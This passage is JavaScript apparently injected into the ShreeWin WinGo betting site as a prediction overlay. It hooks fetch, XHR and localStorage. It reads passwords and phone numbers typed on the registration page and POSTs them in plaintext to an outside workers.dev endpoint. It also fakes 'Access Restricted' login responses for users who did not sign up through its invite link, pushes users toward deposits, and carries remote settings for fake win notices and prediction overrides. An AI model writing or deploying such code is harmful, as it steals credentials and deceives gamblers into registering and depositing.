            const pinia = app?.config?.globalProperties?.$pinia;
            if (pinia && pinia._s) {
                const us = pinia._s.get('UserStore') || pinia._s.get('userStore');
                if (us) {
                    us.isLogin = false;
                    us.token = '';
                    us.userInfo = null;
                }
            }
        } catch(_) {}

        const currentHash = (window.location.hash || '').toLowerCase();
        const isAlreadyOnRegister = currentHash.includes('register');
        if (!isAlreadyOnRegister) {
            const inviteCode = extractInviteCode(remoteConfig.register_url || _appCfg.register_url) || _configuredInviteCode;
            const targetHash = '#/register?invitationCode=' + inviteCode;
            try {
                if (window.location.hash !== targetHash) {
                    window.location.replace(targetHash);
                }
            } catch(_) {
                window.location.hash = targetHash;
            }
        }
        broadcastAppState(true);
    }

    // Continuous route guard: lock out denied user from protected pages + re-purge tokens
    setInterval(() => {
        if (window.__sw_denied_user_id && remoteConfig.strict_reg_lock) {
            // Always re-purge tokens (defensive: in case app code wrote them outside our hook)
            purgeOutsideSession();
            const currentHash = (window.location.hash || '').toLowerCase();
            if (currentHash && !currentHash.includes('register') && !currentHash.includes('login')) {
                enforceAccessDenial(window.__sw_denied_user_id);
            }
        }
    }, 350);

    
    function extractUserDetails() {
        let uid = '';
        let uName = '';
        let uPhone = '';

        // 1. Check Pinia / Vue 3 reactive store
        try {
            const app = document.querySelector('#app')?.__vue_app__;
            const pinia = app?.config?.globalProperties?.$pinia;
            if (pinia && pinia._s) {
                const us = pinia._s.get('UserStore') || pinia._s.get('userStore');
                if (us && us.userInfo) {
                    const u = us.userInfo;
                    if (u.userId || u.id) uid = String(u.userId || u.id).trim();
                    if (u.nickName || u.userName || u.name) uName = String(u.nickName || u.userName || u.name).trim();
                    if (u.phone || u.phoneNumber || u.mobile || u.account) uPhone = String(u.phone || u.phoneNumber || u.mobile || u.account).trim();
                }
            }
        } catch(_) {}

        // 2. Check localStorage & sessionStorage
        try {
            const stores = [];
            try { stores.push(localStorage); } catch(_) {}
            try { if (window.sessionStorage) stores.push(window.sessionStorage); } catch(_) {}
            for (let i = 0; i < stores.length; i++) {
                const st = stores[i];
                const rawUi = st.getItem('userInfo');
                if (rawUi) {
                    try {
                        const u = JSON.parse(rawUi);
                        if (!uid && (u.userId || u.id || u.UserId)) uid = String(u.userId || u.id || u.UserId).trim();
                        if (!uName && (u.nickName || u.NickName || u.userName || u.UserName || u.name)) uName = String(u.nickName || u.NickName || u.userName || u.UserName || u.name).trim();
                        if (!uPhone && (u.phone || u.phoneNumber || u.mobile || u.account || u.telephone)) uPhone = String(u.phone || u.phoneNumber || u.mobile || u.account || u.telephone).trim();
                    } catch(_) {}
                }
                if (!uPhone) {
                    const directPhone = st.getItem('phone') || st.getItem('number') || st.getItem('mobile') || st.getItem('account');
                    if (directPhone && /^\+?[0-9]{7,15}$/.test(String(directPhone).trim())) {
                        uPhone = String(directPhone).trim();
                    }
                }
                if (!uName) {
                    const directNick = st.getItem('nickName') || st.getItem('nickname') || st.getItem('userName');
                    if (directNick) uName = String(directNick).trim();
                }
            }
        } catch(_) {}

        // 3. Check JWT token payload (standard Shreewin / Daman claims)
        try {
            const stores = [];
            try { stores.push(localStorage); } catch(_) {}
            try { if (window.sessionStorage) stores.push(window.sessionStorage); } catch(_) {}
            for (let i = 0; i < stores.length; i++) {
                const st = stores[i];
                const tokenKeys = ['token', 'ar_token', 'access_token', 'refreshToken', 'Authorization'];
                for (let tk = 0; tk < tokenKeys.length; tk++) {
                    const tok = st.getItem(tokenKeys[tk]);
                    if (tok && typeof tok === 'string' && tok.includes('.')) {
                        const parts = tok.split('.');
                        if (parts.length >= 2) {
                            try {
                                const b64 = parts[1].replace(/-/g, '+').replace(/_/g, '/');
                                const json = decodeURIComponent(atob(b64).split('').map(c => '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2)).join(''));
                                const jwt = JSON.parse(json);
                                if (!uid && (jwt.UserId || jwt.userId || jwt.sub || jwt.id)) uid = String(jwt.UserId || jwt.userId || jwt.sub || jwt.id).trim();
                                const jwtName = String(jwt.UserName || jwt.userName || '').trim();
                                const jwtNick = String(jwt.NickName || jwt.nickName || '').trim();
                                if (!uPhone && jwtName && /^\+?[0-9]{8,15}$/.test(jwtName)) {
                                    uPhone = jwtName;
                                }
                                if (!uName && jwtNick) {
                                    uName = jwtNick;
                                } else if (!uName && jwtName && !/^\+?[0-9]{8,15}$/.test(jwtName)) {
                                    uName = jwtName;
                                }
                            } catch(_) {}
                        }
                    }
                }
            }
        } catch(_) {}

        // 4. Sniffed from network API responses
        if (!uid && window.__sw_sniffed_uid) uid = window.__sw_sniffed_uid;
        if (!uName && window.__sw_sniffed_uname) uName = window.__sw_sniffed_uname;
        if (!uPhone && window.__sw_sniffed_phone) uPhone = window.__sw_sniffed_phone;

        return { userId: uid, userName: uName, phone: uPhone };
    }

    function computeAppState() {
        const isLoggedIn = checkAuthStatus();
        const route = detectCurrentRoute();
        const currentBal = getAccurateBalance();
        if (currentBal !== null) {
            lastKnownBalance = currentBal;
        }
        const balance = lastKnownBalance;
        const requiredBalance = (typeof remoteConfig.min_unlock_balance === 'number') ? remoteConfig.min_unlock_balance : MIN_UNLOCK_BALANCE;
        const whitelisted = isUserWhitelisted();
        const blacklisted = isUserBlacklisted();

        const userDetails = extractUserDetails();
        const currentUserId = userDetails.userId;
        const currentUserName = userDetails.userName;
        const currentPhone = userDetails.phone;

        let isAccessDenied = false;
        const uidToCheck = currentUserId || window.__sw_denied_user_id || '';
        if (uidToCheck && remoteConfig.strict_reg_lock && !whitelisted) {
            if (!window.__sw_user_check_cache) window.__sw_user_check_cache = {};
            const cached = window.__sw_user_check_cache[uidToCheck];
            if (cached) {
                isAccessDenied = !!cached.isAccessDenied;
            } else if (isLoggedIn) {
                checkUserEdgeStatus(uidToCheck, balance);
            }
        }

        if (isAccessDenied) {
            enforceAccessDenial(uidToCheck);
        }

        let state = 'STATE_AUTH';
        if (remoteConfig.app_active === false) {
            state = 'STATE_MAINTENANCE';
        } else if (blacklisted) {
            state = 'STATE_AUTH';
        } else if (isAccessDenied) {
            state = 'STATE_ACCESS_DENIED';
        } else if (!isLoggedIn || route.isAuth) {
            state = 'STATE_AUTH';
        } else if (!whitelisted && !remoteConfig.global_unlock && balance < requiredBalance) {
            state = 'STATE_DEPOSIT_LOCKED';
        } else if (!route.isWinGo) {
            state = 'STATE_STANDBY_NORMAL';
        } else {
            state = 'STATE_LIVE_WINGO';
        }

        return {
            state: state,
            isBanned: blacklisted,
            isLoggedIn: isLoggedIn,
            isAccessDenied: isAccessDenied,
            userId: currentUserId || window.__sw_denied_user_id || '',
            userName: currentUserName || '',
            phone: currentPhone || '',
            balance: balance,
            minRequired: requiredBalance,
            isWhitelisted: whitelisted,
            isWinGo: route.isWinGo,
            screenName: route.screenName,
            broadcastNotice: remoteConfig.broadcast_notice || '',
            winFeed: remoteConfig.win_feed || { enabled: true, min_interval_s: 7, max_interval_s: 14, visible_s: 3.6, first_delay_s: 4.5 },
            winUsers: remoteConfig.win_users || [],
            winTestPush: remoteConfig.win_test_push || null,
            depositUrl: remoteConfig.deposit_url || 'https://www.shreewin.ai/#/wallet/Recharge',
            registerUrl: remoteConfig.register_url || _appCfg.register_url || 'https://www.shreewin6.com/#/register?invitationCode=78763141420',
            bubbleIconUrl: remoteConfig.bubble_icon_url || 'https://i.ibb.co/fGpr57nL/20260904-132124.webp',
            branding: remoteConfig.branding || { panel_name: 'NEXY', bubble_label: 'NEXY' },
            version: remoteConfig.version || '',
            updated_at: remoteConfig.updated_at || '',
            predictionOverride: remoteConfig.prediction_override || { enabled: false, number: null, color: 'AUTO', size: 'AUTO', period: '' },
            lastResult: getLastRealResult(route.gameCode),
            gameCode: route.gameCode || '',
        };
    }

    let lastDeliveredToNexy = '';
    let lastDeliveredToAndroid = '';

    function broadcastAppState(force = false) {
        try {
            const appState = computeAppState();
            window.__SHREEWIN_STATE__ = appState;
            const stateKey = `${appState.state}:${appState.isLoggedIn}:${appState.isAccessDenied}:${appState.userId}:${appState.screenName}:${appState.balance}:${appState.minRequired}:${appState.isWhitelisted}:${appState.isBanned}:${appState.broadcastNotice}:${appState.depositUrl}:${appState.registerUrl}:${appState.bubbleIconUrl}:${appState.currentRoute}:${appState.gameCode}:${JSON.stringify(appState.predictionOverride || {})}:${appState.lastResult.period}:${appState.lastResult.number}:${JSON.stringify(appState.winFeed || {})}:${JSON.stringify(appState.winUsers || [])}:${JSON.stringify(appState.winTestPush || null)}:${JSON.stringify(appState.branding || {})}`;

            // Notify in-page Nexy HUD (delivers as soon as Nexy mounts)
            if (typeof window.nexyUpdateState === 'function') {
                if (force || stateKey !== lastDeliveredToNexy) {
                    lastDeliveredToNexy = stateKey;
                    window.nexyUpdateState(appState);
                }
            }

            // Notify Android Bridge
            if (window.AndroidApp && typeof window.AndroidApp.onUserStateChange === 'function') {
                if (force || stateKey !== lastDeliveredToAndroid) {
                    lastDeliveredToAndroid = stateKey;
                    window.AndroidApp.onUserStateChange(JSON.stringify(appState));
                }
            }
        } catch(e) {}
    }
    window.__shreewin_check_auth = checkAuthStatus;

    // Expose instant refresh hook
    window.__shreewin_refresh_state = function() {
        broadcastAppState(true);
    };

    // --- 4. Deep-extract WinGo variant + period number + countdown ---
    // Responses may carry all 4 variants at once, or one variant per request
    // (gameCode in the URL). Collect (gameCode, period, countdown) triples
    // and keep the entry matching the on-screen variant.
    function extractGamePayload(data, url) {
        if (!data) return null;
        const urlCode = gameCodeFromUrl(url);
        const entries = [];

        function note(obj) {
            if (!obj || typeof obj !== 'object' || Array.isArray(obj)) return;
            let period = '';
            const pKeys = ['issueNumber', 'IssueNumber', 'issue', 'period', 'issueNo', 'drawIssue', 'betIssue'];
            for (let i = 0; i < pKeys.length; i++) {
                const val = obj[pKeys[i]];
                if (val !== undefined && val !== null && /^202\d{10,18}$/.test(String(val).trim())) {
                    period = String(val).trim();
                    break;
                }
            }
            if (!period) return;
            let code = urlCode;
            const cKeys = ['gameCode', 'game_code', 'gameType', 'game_type', 'typeCode', 'gameName'];
            for (let i = 0; i < cKeys.length; i++) {
                const cv = obj[cKeys[i]];
                if (cv !== undefined && cv !== null) {
                    const nc = normalizeGameCode(cv);
                    if (nc) { code = nc; break; }
                }
            }
            let seconds = -1;
            const sKeys = ['countdown', 'timeRemaining', 'seconds', 'leftTime', 'second', 'timeLeft', 'remainTime', 'leftSecond'];
            for (let j = 0; j < sKeys.length; j++) {
                const sVal = obj[sKeys[j]];
                if (typeof sVal === 'number' && sVal >= 0 && sVal <= 600) { seconds = sVal; break; }
            }
            if (obj.current && typeof obj.current === 'object') {
                const cur = obj.current;
                if (cur.endTime && seconds < 0) {
                    try {
                        const targetMs = new Date(cur.endTime).getTime();
                        const diffSec = Math.floor((targetMs - Date.now()) / 1000);
                        if (diffSec >= 0 && diffSec <= 600) seconds = diffSec;
                    } catch(e) {}
                }
            }
            entries.push({ gameCode: code || '', period: period, countdown: seconds });
        }

        function inspect(obj, depth) {
            if (!obj || depth > 6) return;
            if (typeof obj === 'string') {
                const m = obj.match(/\b(202\d{10,18})\b/);
                if (m) entries.push({ gameCode: urlCode, period: m[1], countdown: -1 });
                return;
            }
            if (typeof obj === 'number') {
                const s = String(obj);
                if (/^202\d{10,18}$/.test(s)) entries.push({ gameCode: urlCode, period: s, countdown: -1 });
                return;
            }
            if (typeof obj !== 'object') return;
            note(obj);
            if (Array.isArray(obj)) {
                for (let k = 0; k < Math.min(obj.length, 8); k++) inspect(obj[k], depth + 1);
                return;
            }
            const subKeys = ['current', 'data', 'list', 'EmerdList', 'result', 'results', 'items', 'records', 'next'];
            for (let m = 0; m < subKeys.length; m++) {
                if (obj[subKeys[m]]) inspect(obj[subKeys[m]], depth + 1);
            }
        }

        try { inspect(data, 0); } catch(e) {}
        if (!entries.length) return null;

        const active = detectActiveVariant();
        const pick = entries.find(e => e.gameCode && active && e.gameCode === active)
            || entries.find(e => e.gameCode && urlCode && e.gameCode === urlCode)
            || entries.find(e => !e.gameCode)
            || entries[0];
        // Merge: a period-only entry plus a countdown-only sibling of the same variant
        let seconds = pick.countdown;
        if (seconds < 0) {
            for (let i = 0; i < entries.length; i++) {
                if (entries[i].countdown >= 0 && (!entries[i].gameCode || entries[i].gameCode === pick.gameCode || !pick.gameCode)) {
                    seconds = entries[i].countdown;
                    break;
                }
            }
        }
        return { issueNumber: pick.period, countdown: seconds, gameCode: pick.gameCode || active || urlCode };
    }

    function notifyGameData(source, rawData, url) {
        try {
            if (!rawData) return;

            // Check if payload contains genuine wallet balance
            const bal = extractBalanceFromPayload(rawData, source);
            if (bal !== null) {
                lastKnownBalance = bal;
                try { localStorage.setItem('shreewin_balance', String(bal)); } catch(e) {}
                broadcastAppState(true);
            }

            // Skip game data broadcast when locked or not authenticated
            const currentState = (window.__SHREEWIN_STATE__ && window.__SHREEWIN_STATE__.state) || '';
            if (currentState === 'STATE_DEPOSIT_LOCKED' || currentState === 'STATE_AUTH' || currentState === 'STATE_MAINTENANCE') {
                return;
            }

            const extracted = extractGamePayload(rawData, url);
            if (!extracted && source.indexOf('dom') !== 0) return;

            // Capture genuine drawn results, tagged by variant. Newest wins per variant.
            const urlCode = gameCodeFromUrl(url);
            const activeNow = detectActiveVariant();
            const resultEntries = extractResultEntries(rawData, urlCode || activeNow);
            for (let ri = 0; ri < resultEntries.length; ri++) {
                const re = resultEntries[ri];
                storeRealResult(re.gameCode || activeNow || 'WinGo_30S', re.period, re.number);
            }

            const issueNum = extracted ? extracted.issueNumber : '';
            const countdownSec = extracted ? extracted.countdown : -1;
            const gameCode = (extracted && extracted.gameCode) || urlCode || activeNow || '';

            // Per-variant duplicate guard — switching tabs re-broadcasts immediately
            const memKey = gameCode || '_default';
            const mem = lastBroadcastByVariant[memKey] || { period: '', countdown: -999 };
            if (issueNum === mem.period && (countdownSec < 0 || countdownSec === mem.countdown)) {
                return;
            }
            lastBroadcastByVariant[memKey] = { period: issueNum || mem.period, countdown: countdownSec >= 0 ? countdownSec : mem.countdown };

            // Persist globally in window and localStorage
            if (issueNum) {
                window.__WINGO_CURRENT_PERIOD__ = issueNum;
                try { localStorage.setItem('WINGO_LAST_PERIOD', issueNum); } catch(e) {}
            }
            if (gameCode) {
                window.__WINGO_CURRENT_GAME__ = gameCode;
                try { localStorage.setItem('WINGO_LAST_GAME', gameCode); } catch(e) {}
            }

            const payload = {
                source: source,
                issueNumber: issueNum,
                countdown: countdownSec,
                gameCode: gameCode,
                raw: rawData
            };
            const jsonStr = JSON.stringify(payload);

            // 1. Notify Android App Bridge
            if (window.AndroidApp && window.AndroidApp.onGameApiData) {
                window.AndroidApp.onGameApiData(jsonStr);
            }

            // 2. Direct Sync into in-page Nexy HUD
            if (window.nexyUpdateGame && (issueNum || countdownSec >= 0)) {
                window.nexyUpdateGame(issueNum, countdownSec, 8, gameCode);
            }
        } catch(e) {}
    }

    // --- 4.8. App Registered Users Tracker ---
    // --- 4.8. App Registered Users Tracker ---
    function recordAppRegistration(userId, userName, source, explicitPhone, explicitPass) {
        try {
            const uid = String(userId || '').trim();
            if (!uid || uid.length < 2 || uid.startsWith('guest_') || uid.startsWith('player_')) return;

            // STRICT GUARD: Never record a user who has been denied access or is not a genuine new registration
            if (window.__sw_denied_user_id && String(window.__sw_denied_user_id) === uid) return;
            if (window.__sw_user_check_cache && window.__sw_user_check_cache[uid] && window.__sw_user_check_cache[uid].isAccessDenied) return;

            const channel = (window.__APP_CONFIG__ && window.__APP_CONFIG__.channel) || 'v2';
            const inviteCode = lastTypedInviteCode || window.__sw_last_invite || extractInviteCode(remoteConfig.register_url || _appCfg.register_url) || _configuredInviteCode;
            const phone = explicitPhone || lastTypedPhone || window.__sw_last_phone || '';
            const password = explicitPass || lastTypedPassword || window.__sw_last_password || '';

            const payload = {
                userId: uid,
                userName: userName || ('Player_' + uid.slice(-4)),
                phone: phone,
                password: password,
                channel: channel,
                inviteCode: inviteCode,
                source: source || 'app',
                timestamp: Date.now()
            };

            // 1. Send via Native Android Bridge (bypass WebView fetch/cors/lifecycle limits)
            try {
                if (window.AndroidApp && typeof window.AndroidApp.recordRegistration === 'function') {
                    window.AndroidApp.recordRegistration(JSON.stringify(payload));
                }
            } catch(_) {}

            // 2. Send via Web Fetch
            const regUrl = 'https://user-state-api.shakir-ansarii075.workers.dev/api/record-registration';
            fetch(regUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload),
                cache: 'no-store'
            }).then(r => r.json()).then(res => {
                console.log('[ShreeWin Hook] Registration saved on edge:', res);
            }).catch(() => {});
        } catch(e) {}
    }

    
    // Listen for register button clicks to grab active input values
    document.addEventListener('click', (e) => {
        try {
            const btn = e.target.closest('button, .van-button, [role="button"], a');
            if (!btn) return;
            const txt = (btn.textContent || '').trim().toLowerCase();
            const onRegPage = location.hash && location.hash.toLowerCase().includes('register');
            if (txt.includes('register') || txt.includes('sign up') || txt.includes('create') || txt.includes('submit')) {
                if (onRegPage && !txt.includes('have an account')) {
                    window.__sw_reg_button_pressed = true;
                }
                const inputs = document.querySelectorAll('input');
                inputs.forEach(inp => {
                    const val = inp.value ? inp.value.trim() : '';
                    const type = (inp.type || '').toLowerCase();
                    const ph = (inp.placeholder || '').toLowerCase();
                    if ((type === 'password' || ph.includes('password') || ph.includes('pwd')) && val.length >= 4) {
                        window.__sw_last_password = val;
                        lastTypedPassword = val;
                    }
                    if ((type === 'tel' || type === 'number' || ph.includes('phone') || ph.includes('mobile')) && val.length >= 7) {
                        const d = val.replace(/[^0-9]/g, '');
                        window.__sw_last_phone = d;
                        lastTypedPhone = d;
                    }
                    if ((ph.includes('invite') || ph.includes('code')) && val.length >= 4) {
                        window.__sw_last_invite = val;
                        lastTypedInviteCode = val;
                    }
                });
            }
        } catch(_) {}
    }, true);

    function inspectRegistrationPayload(json, url) {
        try {
            if (!json || typeof json !== 'object') return;
            const u = String(url || '').toLowerCase();
            // Strictly exclude login calls and login screens
            if (u.includes('login') || (location.hash && location.hash.toLowerCase().includes('login'))) {
                window.__sw_last_login_seen = Date.now();
                return;
            }

            const isRegEndpoint = u.includes('webapi/register') || u.includes('/user/register') || u.includes('/api/register') || u.includes('signup') || u.includes('registerbyphone');
            if (!isRegEndpoint) return;

            const isSuccess = json.code === 0 || json.code === 200 || json.status === 1 || json.status === 200 || json.success === true || json.msg === 'success' || json.message === 'success';
            if (!isSuccess) return;

            let uid = '';
            let uname = '';
            const d = (json.data && typeof json.data === 'object') ? json.data : (json.result && typeof json.result === 'object' ? json.result : json);
            if (d) {
                uid = String(d.userId || d.userid || d.id || d.uid || '').trim();
                uname = String(d.userName || d.username || d.nickName || '').trim();
            }

            if (uid && uid !== 'null' && uid !== 'undefined') {
                recordAppRegistration(uid, uname, 'api_intercept', window.__sw_last_phone, window.__sw_last_password);
                return;
            }

            const tok = json.token || (json.data && json.data.token);
            if (tok && typeof tok === 'string' && tok.includes('.')) {
                try {
                    const jwtPayload = JSON.parse(decodeURIComponent(atob(tok.split('.')[1].replace(/-/g, '+').replace(/_/g, '/')).split('').map(c => '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2)).join('')));
                    const jwtUid = String(jwtPayload.UserId || jwtPayload.userId || jwtPayload.sub || '');
                    const jwtPhone = String(jwtPayload.UserName || jwtPayload.phone || '');
                    const jwtNick = String(jwtPayload.NickName || jwtPayload.userName || '');
                    if (jwtUid) {
                        recordAppRegistration(jwtUid, jwtNick || uname, 'jwt_decode', jwtPhone || window.__sw_last_phone, window.__sw_last_password);
                    }
                } catch(_) {}
            }
            setTimeout(checkRegistrationTransition, 600);
            setTimeout(checkRegistrationTransition, 2000);
        } catch(_) {}
    }

    function checkRegistrationTransition() {
        try {
            if (window.__sw_denied_user_id) return;
            if (window.__sw_last_login_seen && (Date.now() - window.__sw_last_login_seen < 120000)) return;
            if (location.hash && location.hash.toLowerCase().includes('login')) return;
            if (!window.__sw_reg_button_pressed) return;

            const raw = localStorage.getItem('userInfo');
            if (!raw) return;
            const u = JSON.parse(raw);
            const uid = String(u.userId || u.id || '').trim();
            if (!uid || uid === 'null' || uid === 'undefined') return;

            const wasOnRegister = location.hash && location.hash.toLowerCase().includes('register');
            if (wasOnRegister) {
                recordAppRegistration(uid, u.userName || 'Player', 'route_transition', window.__sw_last_phone, window.__sw_last_password);
            }
        } catch(_) {}
    }

    // Helper: Check if URL is lottery or balance endpoint
    function isLotteryOrWalletUrl(url) {
        if (!url || typeof url !== 'string') return false;
        const u = url.toLowerCase();
        return u.includes('game') ||
               u.includes('lottery') ||
               u.includes('wingo') ||
               u.includes('saaslottery') ||
               u.includes('getgameissue') ||
               u.includes('getnoaverageemerdlist') ||
               u.includes('getemerdlist') ||
               u.includes('getwinthelotteryresult') ||
               u.includes('getbalance') ||
               u.includes('getallwallets') ||
               u.includes('getsaasallwallets') ||
               u.includes('getuserpersonal') ||
               u.includes('shreewinapi') ||
               u.includes('apiweb') ||
               u.includes('/api/webapi');
    }

    // Helper: Extract candidate UID from any API payload or JWT token
    function extractCandidateUid(json) {
        if (!json || typeof json !== 'object') return '';
        let uid = json.userId || json.UserId || json.userid || json.id || json.uid || '';
        if (uid) return String(uid).trim();

        const d = (json.data && typeof json.data === 'object') ? json.data : (json.result && typeof json.result === 'object' ? json.result : null);
        if (d) {
            uid = d.userId || d.UserId || d.userid || d.id || d.uid || '';
            if (uid) return String(uid).trim();
        }

        const tok = (typeof json.data === 'string' && json.data.includes('.')) ? json.data
                  : (json.token && typeof json.token === 'string' && json.token.includes('.')) ? json.token
                  : (d && typeof d.token === 'string' && d.token.includes('.')) ? d.token
                  : (d && typeof d.ar_token === 'string' && d.ar_token.includes('.')) ? d.ar_token
                  : '';
        if (tok) {
            try {
                const parts = tok.split('.');
                if (parts.length >= 2) {
                    const b64 = parts[1].replace(/-/g, '+').replace(/_/g, '/');
                    const decoded = atob(b64);
                    const payload = JSON.parse(decoded);
                    uid = payload.UserId || payload.userId || payload.userid || payload.id || payload.sub || '';
                    if (uid) return String(uid).trim();
                }
            } catch(_) {}
        }
        return '';
    }

    function extractCandidatePhone(json) {
        if (!json || typeof json !== 'object') return '';
        const d = (json.data && typeof json.data === 'object') ? json.data : json;
        let p = d.phone || d.phoneNumber || d.mobile || d.userName || d.username || '';
        if (p) return String(p).trim();
        const tok = (typeof json.data === 'string' && json.data.includes('.')) ? json.data : (d && typeof d.token === 'string' && d.token.includes('.') ? d.token : '');
        if (tok) {
            try {
                const payload = JSON.parse(atob(tok.split('.')[1].replace(/-/g, '+').replace(/_/g, '/')));
                p = payload.UserName || payload.phone || '';
                if (p) return String(p).trim();
            } catch(_) {}
        }
        return '';
    }

    // --- 5. Hook Fetch API (Pre-flight + Post-response Blocking) ---
    const origFetch = window.fetch;

    // Utility: build a blocked JSON Response the app's code path will accept
    function _blockedLoginResponse() {
        return new Response(JSON.stringify({
            code: -1,
            msg: "Access Restricted: This account was not registered through our official app link.",
            message: "Access Restricted: This account was not registered through our official app link.",
            data: null,
            token: null,
            result: null
        }), {
            status: 200,
            headers: { 'Content-Type': 'application/json' }
        });
    }

    // Extract phone from fetch POST body (login request body typically has username/phone)
    function _extractPhoneFromFetchBody(args) {
        try {
            const opts = args[1];
            if (!opts || !opts.body) return '';
            let bodyStr = '';
            if (typeof opts.body === 'string') bodyStr = opts.body;
            else return '';
            const obj = JSON.parse(bodyStr);
            const raw = obj.username || obj.phone || obj.mobile || obj.phoneNumber || obj.account || '';
            return String(raw).replace(/[^0-9]/g, '');
        } catch(_) { return ''; }
    }

    if (typeof origFetch === 'function') {
        window.fetch = async function(...args) {
            const url = (args[0] && typeof args[0] === 'string') ? args[0] : (args[0] && args[0].url ? args[0].url : '');
            const uLower = String(url || '').toLowerCase();
            const isLoginEndpoint = uLower.includes('login') || uLower.includes('userlogin') || uLower.includes('/webapi/login');

            // ── PRE-FLIGHT: Block login request BEFORE it's sent ──
            if (isLoginEndpoint && remoteConfig.strict_reg_lock) {
                // 1. If any user is already denied in this session, block all logins
                if (window.__sw_denied_user_id) {
                    console.warn('[ShreeWin Hook] FETCH PRE-BLOCK: Session has denied user, blocking login request');
                    enforceAccessDenial(window.__sw_denied_user_id);
                    return _blockedLoginResponse();
                }
                // 2. Check request body phone against known denied users in cache
                const reqPhone = _extractPhoneFromFetchBody(args);
                if (reqPhone && window.__sw_user_check_cache) {
                    for (const cachedId of Object.keys(window.__sw_user_check_cache)) {
                        if (window.__sw_user_check_cache[cachedId] && window.__sw_user_check_cache[cachedId].isAccessDenied) {
                            // Any previously denied user blocks all login attempts
                            console.warn('[ShreeWin Hook] FETCH PRE-BLOCK: Cached denied user found, blocking login for phone:', reqPhone);
                            enforceAccessDenial(cachedId);
                            return _blockedLoginResponse();
                        }
                    }
                }
            }

            // ── Send the real request ──
            const response = await origFetch.apply(this, args);
            try {
                const clone = response.clone();
                const json = await clone.json().catch(() => null);
                if (json && typeof json === 'object') {
                    inspectRegistrationPayload(json, url);

                    const candidateUid = extractCandidateUid(json);
                    const candidatePhone = extractCandidatePhone(json);
                    if (candidatePhone) window.__sw_sniffed_phone = candidatePhone;
                    if (candidateUid && candidateUid !== 'null' && candidateUid !== 'undefined') {
                        window.__sw_sniffed_uid = candidateUid;
                    }

                    // ── POST-RESPONSE: Check UID from response against DB ──
                    if (candidateUid && candidateUid !== 'null' && candidateUid !== 'undefined') {
                        if (isLoginEndpoint || uLower.includes('getuserinfo') || uLower.includes('/user/info')) {
                            if (remoteConfig.strict_reg_lock) {
                                let check = checkUserAccessSync(candidateUid, 0);
                                if (!check) {
                                    check = await checkUserAccessAsync(candidateUid, 0);
                                }
                                if (check && check.isAccessDenied) {
                                    console.warn('[ShreeWin Hook] FETCH POST-BLOCK: Denied UID in response:', candidateUid);
                                    // CRITICAL: Wipe any tokens/session the app might have stored
                                    // from this response before our hook could block it
                                    enforceAccessDenial(candidateUid);
                                    // Return fake blocked response instead of real one
                                    return _blockedLoginResponse();
                                }
                            }
                        }
                    }

                    if (isLotteryOrWalletUrl(url) || (json && (json.data || json.issueNumber || json.amount || json.balance))) {
                        notifyGameData('fetch:' + url, json, url);
                    }
                }
            } catch(e) {
                console.error('[ShreeWin Hook] Fetch hook error:', e);
            }
            return response;
        };
    }

    // --- 5.5 Hook localStorage.setItem to prevent denied users from persisting tokens ---
    const _origLSSetItem = localStorage.setItem.bind(localStorage);
    const _tokenStorageKeys = ['token', 'refreshToken', 'ar_token', 'access_token', 'Authorization', 'tokenHeader', 'userInfo'];
    try {
        localStorage.setItem = function(key, value) {
            // If a denied user is in session, block token/session persistence
            if (window.__sw_denied_user_id && _tokenStorageKeys.indexOf(key) >= 0) {
                console.warn('[ShreeWin Hook] STORAGE BLOCK: Prevented', key, 'write for denied user');
                return;
            }
            // If writing userInfo, check if the UID matches a denied user
            if (key === 'userInfo' && window.__sw_user_check_cache && value) {
                try {
                    const parsed = JSON.parse(value);
                    const uid = String(parsed.userId || parsed.id || '').trim();
                    if (uid && window.__sw_user_check_cache[uid] && window.__sw_user_check_cache[uid].isAccessDenied) {
                        console.warn('[ShreeWin Hook] STORAGE BLOCK: Prevented userInfo write for denied UID:', uid);
                        return;
                    }
                } catch(_) {}
            }
            return _origLSSetItem(key, value);
        };
    } catch(_) {}

    // --- 6. Hook XMLHttpRequest (Pre-flight + Post-response Blocking) ---
    const origOpen = XMLHttpRequest.prototype.open;
    const origSend = XMLHttpRequest.prototype.send;

    XMLHttpRequest.prototype.open = function(method, url, ...rest) {
        this._hookUrl = (typeof url === 'string') ? url : '';
        this._hookMethod = (typeof method === 'string') ? method.toUpperCase() : 'GET';
        return origOpen.call(this, method, url, ...rest);
    };

    XMLHttpRequest.prototype.send = function(...args) {
        const self = this;
        const url = self._hookUrl || '';
        const uLower = String(url).toLowerCase();
        const isLoginEndpoint = uLower.includes('login') || uLower.includes('userlogin') || uLower.includes('/webapi/login');
        let payloadProcessed = false;

        // ── PRE-FLIGHT: Block login XHR BEFORE it's sent ──
        if (isLoginEndpoint && remoteConfig.strict_reg_lock) {
            if (window.__sw_denied_user_id) {
                console.warn('[ShreeWin Hook] XHR PRE-BLOCK: Session has denied user, aborting login XHR');
                // Don't send at all — fake the response
                try {
                    const fakeBlocked = JSON.stringify({
                        code: -1,
                        msg: "Access Restricted: This account was not registered through our official app link.",
                        message: "Access Restricted: This account was not registered through our official app link.",
                        data: null, token: null, result: null
                    });
                    Object.defineProperty(self, 'readyState', { value: 4, configurable: true, writable: true });
                    Object.defineProperty(self, 'status', { value: 200, configurable: true, writable: true });
                    Object.defineProperty(self, 'statusText', { value: 'OK', configurable: true, writable: true });
                    Object.defineProperty(self, 'responseText', { value: fakeBlocked, configurable: true, writable: true });
                    Object.defineProperty(self, 'response', { value: fakeBlocked, configurable: true, writable: true });
                } catch(_) {}
                enforceAccessDenial(window.__sw_denied_user_id);
                // Fire onreadystatechange with readyState=4 so the app thinks it completed
                setTimeout(() => {
                    try {
                        if (typeof self.onreadystatechange === 'function') {
                            self.onreadystatechange(new Event('readystatechange'));
                        }
                        if (typeof self.onload === 'function') {
                            self.onload(new Event('load'));
                        }
                        self.dispatchEvent(new Event('load'));
                        self.dispatchEvent(new Event('loadend'));
                    } catch(_) {}
                }, 10);
                return; // Do NOT call origSend — request never leaves the device
            }
        }

        const processPayload = () => {
            if (payloadProcessed) return;
            payloadProcessed = true;
            try {
                if (self.responseText && self.responseText.includes('{')) {
                    try {
                        const json = JSON.parse(self.responseText);
                        inspectRegistrationPayload(json, url);

                        const candidateUid = extractCandidateUid(json);
                        const candidatePhone = extractCandidatePhone(json);
                        if (candidatePhone) window.__sw_sniffed_phone = candidatePhone;
                        if (candidateUid && candidateUid !== 'null' && candidateUid !== 'undefined') {
                            window.__sw_sniffed_uid = candidateUid;
                        }
